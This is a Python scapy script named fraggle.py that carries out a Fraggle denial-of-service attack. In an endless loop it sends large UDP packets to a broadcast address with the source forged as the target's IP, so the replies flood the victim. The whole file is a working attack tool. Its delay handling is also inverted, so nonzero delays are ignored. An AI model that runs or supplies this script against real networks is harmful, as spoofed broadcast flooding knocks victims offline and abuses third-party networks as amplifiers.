import random, time, sys, os
from scapy.all import *

# fraggle.py

# confirm privilege
if os.geteuid() != 0:
    sys.exit('\r\nScript requires root elevation!\r\n')
    
# confirm cli-arg length
if len(sys.argv) != 5:
    sys.exit('\r\nUsage: <target-ip> <broadcast-ip> <port> <delay-ms|0=disable>\r\n')
    
i = 0

flag = False

# confirm delay
if int(sys.argv[4]) == 0:
    flag = True

while True:
    try:
        i +=1
    
        print(f'[Packet #{i}] {sys.argv[1]} ---> {sys.argv[2]}')
    
        # craft udp packet pointing to broadcast address
        pkt = IP(src=sys.argv[1], dst=sys.argv[2]) / UDP(sport=RandShort(), dport=int(sys.argv[3])) / Raw(load="X" * 1024)
    
        # send to broadcast
        send(pkt, verbose=0)
    
        if flag:
            # delay in m/s
            time.sleep(int(sys.argv[4]) / 1000)
    
    except KeyboardInterrupt:
        sys.exit('\r\nDone.\r\n')
    except:
        pass
